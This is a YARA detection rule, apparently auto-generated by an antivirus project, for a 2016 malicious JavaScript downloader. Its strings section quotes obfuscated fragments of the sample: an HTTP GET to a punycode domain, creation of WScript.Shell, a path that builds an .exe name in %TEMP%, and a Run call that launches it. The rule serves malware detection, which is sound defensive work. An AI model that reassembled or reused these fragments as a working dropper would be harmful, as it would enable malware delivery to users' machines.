rule sig_20160401_308aa9da83b38b43dfc79d2202b29dc2 {
  meta:
    description = "datamaliciousorder - file 20160401_308aa9da83b38b43dfc79d2202b29dc2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "426bddc038296dc17b0d78230cb32e04c3563847b751cabd92830167463e2f2c"

  strings:
    $s1  = "QkSt[UtNm](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "function WmYnb(HrPxy, BeCw){VamMi = VamMi * 1; return HrPxy - BeCw;};" fullword ascii
    $s3  = "var SoUpe = function PlqVc() {return WScript[RcFc](\"WScript\"+\".Shell\");}(), HbHkm = 11;" fullword ascii
    $s4  = "if (QkSt[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function IpuVt(){return VqbGpu + \"\";};" fullword ascii
    $s6  = "function HagJv() {return SoUpe[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"4PUJZ8H6rOMiG53d.ex\" + \"e\";};" fullword ascii
    $s7  = "function YqqSd() {return ((WnBbp == true) && (WnBbp == NxqYun)) ? 1 : VamMi;};" fullword ascii
    $s8  = "}while (OqbKp);" fullword ascii
    $s9  = "function NvDxe()" fullword ascii
    $s10 = "function CyFyw(PhLt) {var TswQrr = (1, 2, 3, 4, 5, PhLt); return TswQrr;};" fullword ascii
    $s11 = "return WmYnb(HwzSpt, PtIi);" fullword ascii
    $s12 = "var VyHf = false;" fullword ascii
    $s13 = "var SaGvd = new this[\"Date\"]();" fullword ascii
    $s14 = "var NxqYun = false;" fullword ascii
    $s15 = "WnBbp = true; " fullword ascii
    $s16 = "NxqYun = true; " fullword ascii
    $s17 = "function XgfKq(CtgIsr){SoUpe[\"R\"+\"un\"](CtgIsr, VamMi, VamMi);};" fullword ascii
    $s18 = "var WnBbp = false;" fullword ascii
    $s19 = "function IctCc(){return 23;};" fullword ascii
    $s20 = "function BxvOa(){return RcFc;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}